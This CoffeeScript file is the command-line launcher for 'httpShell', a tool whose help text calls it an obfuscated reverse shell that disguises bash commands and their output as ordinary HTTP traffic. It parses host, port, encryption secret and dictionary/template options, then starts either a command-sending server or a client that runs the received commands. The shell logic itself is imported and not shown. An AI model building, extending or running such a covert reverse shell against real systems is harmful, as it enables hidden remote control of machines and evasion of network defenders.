fs = require 'fs'
program = require 'commander'
{client,server} = require './includes/reverse_shell'

#Default Options
client_dict = ['hello','world']
server_dict = ['hello','world']
client_template = '##$$##'
server_template = '##$$##'
port = 80
host = "127.0.0.1"
delay = 1000 #time between connections
password = 'supersecret'

#Read a file. Each line in the file will be an element in a dictionary.
readbyline = (path) ->
        data = fs.readFileSync path,'utf8'
        #figure out enline
        data = data.split('\r\n')
        data = data[0].split('\n') if data.length == 1
        output = []
        for i in [0...data.length]
                d = data[i]
                for j in [0...data.length]
                        #make sure we don't have duplicate or overlapping elements. can't have 'goodbye' and 'bye'
                        d = if data[j].indexOf(data[i]) is -1 or j is i then d else ""
                output = if d isnt "" then output.concat(d) else output
        output

printconfig = ->
        #let the user know whats up
        console.log "We will be using the following options:"
        console.log "host             : #{host}"
        console.log "port             : #{port}"
        console.log "delay            : #{delay}"
        console.log "password         : #{password}"
        console.log "client dictionary: #{client_dict}"
        console.log "server dictionary: #{server_dict}"
        console.log "client template  : \n#{client_template}"
        console.log "server template  : \n#{server_template}\n"

parseconfig = =>
        #Should we shut up?
        #console.log program
        if program.quiet?
                console.log = (string) ->
                        return

        #Absorb the options
        host     = program.host
        port     = program.port
        delay    = program.delay
        password = program.secret

        #Parse the dictionary file argument
        if program.dict?
                dict = readbyline program.dict
                client_dict = dict
                server_dict = dict

        #Parse the client dictionary file argument
        if program.clientdict?
                client_dict = readbyline program.clientdict
        #Parse the server dictionary file argument
        if program.serverdict?
                server_dict = readbyline program.serverdict
        #Read the client template file
        if program.clienttemplate?
                client_template = fs.readFileSync program.clienttemplate, 'utf8'
        #Read the server template file
        if program.servertemplate?
                server_template = fs.readFileSync program.servertemplate, 'utf8'

#Help Message / Description...
helpme = \
"\  Name:\n\t\
        httpShell - obfuscated reverse shell that looks like HTTP\n\n\

  Description:\n\t\
        This is an obfuscated client/server reverse shell. \n\n\t\

        If running as client, this application will act like an HTTP client (web browser),\n\t\
        making HTTP requests to the server. These requests will be encoded using the dictionary\n\t\
        files specified by the user. These requests will contain the results of the bash commands\n\t\
        send in the HTTP responses.\n\n\t\

        If running as the server, this application will act like an HTTP server, answering HTTP requests\n\t\
        sent by the client or by actual web browsers. The HTTP responses will bash commands encoded\n\t\
        into the dictionary file specified by the user.\n\n\

  Author:\n\t\
        Written by Ben Toews (mastahyeti)\n\n\

  Copyright:\n\t\
        Copyright © 2011 Neohapsis Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.\n\t\
        This is free software: you are free to change and redistribute it.  There is NO WARRANTY, to the extent permitted by law."


#Setup the options parsing
program
  .version('0.0.2')
  .option('-a --host [address]',"Server IP address or domain name [#{host}](Client/Server)",host)
  .option('-b --port [port]',"Server listening port [#{port}] (Client/Server)",port)
  .option('-c --delay [delay-ms]',"Miliseconds to delay between requests [#{delay}](Client only)",delay)
  .option('-e --secret [shared]',"Shared secret to use for aes192 encryption [#{password}](Client/Server)",password)
  .option('-f --dict <filename>','Path to the dictionary file to use for both client and server (Client/Server)')
  .option('-g --clientdict <filename>','Path to the dictionary to use for client communication (Client/Server)')
  .option('-h --serverdict <filename>','Path to the dictionary to use for server communication (Client/Server)')
  .option('-i --clienttemplate <filename>','Path to the template file to use for client communication (Client/Server)')
  .option('-j --servertemplate <filename>','Path to the template file to use for server communication (Client/Server)')
  .option('-k --quiet','Run quietly. (Client only)')

program
  .command('server')
  .description('Start a fake HTTP server. This is the end sending commands to the client.')
  .action =>
        parseconfig()
        printconfig()
        server host,port,delay,password,client_dict,server_dict,client_template,server_template

program
  .command('client')
  .description('Start a fake HTTP client. This is the end that receives and runs the command from the server.')
  .action =>
        parseconfig()
        printconfig()
        client host,port,delay,password,client_dict,server_dict,client_template,server_template

program.on '--help', ->
	console.log helpme

program.parse process.argv